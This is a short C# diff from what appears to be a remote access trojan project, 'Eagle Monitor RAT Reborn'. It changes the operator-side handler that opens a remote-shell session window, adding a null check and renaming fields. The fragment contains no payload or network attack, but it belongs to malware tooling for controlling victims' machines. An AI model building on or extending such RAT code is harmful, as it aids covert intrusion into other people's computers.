@@ -13,19 +13,21 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
     {
         public RemoteStartShellPacketHandler(StartShellSessionPacket startShellSessionPacket) : base()
         {
-            try
+            if (ClientHandler.ClientHandlersList[startShellSessionPacket.BaseIp].ClientForm != null)
             {
-                ClientHandler.ClientHandlersList[startShellSessionPacket.baseIp].clientForm.remoteShellGuna2ToggleSwitch.Enabled = false;
-                ClientHandler.ClientHandlersList[startShellSessionPacket.baseIp].clientForm.remoteShellGuna2TextBox.Enabled = true;
-                ClientHandler.ClientHandlersList[startShellSessionPacket.baseIp].clientForm.remoteShellStdOutRichTextBox.BeginInvoke((MethodInvoker)(() =>
+                try
                 {
-                    ClientHandler.ClientHandlersList[startShellSessionPacket.baseIp].clientForm.remoteShellStdOutRichTextBox.Text += "\n-------------New session started !-------------\n";
+                    ClientHandler.ClientHandlersList[startShellSessionPacket.BaseIp].ClientForm.remoteShellGuna2ToggleSwitch.Enabled = false;
+                    ClientHandler.ClientHandlersList[startShellSessionPacket.BaseIp].ClientForm.remoteShellGuna2TextBox.Enabled = true;
+                    ClientHandler.ClientHandlersList[startShellSessionPacket.BaseIp].ClientForm.remoteShellStdOutRichTextBox.BeginInvoke((MethodInvoker)(() =>
+                    {
+                        ClientHandler.ClientHandlersList[startShellSessionPacket.BaseIp].ClientForm.remoteShellStdOutRichTextBox.Text += "\n-------------New session started !-------------\n";
 
-                }));
+                    }));
+                }
+                catch { }
+                return;
             }
-            catch { }
-            return;
-
         }
     }
 }
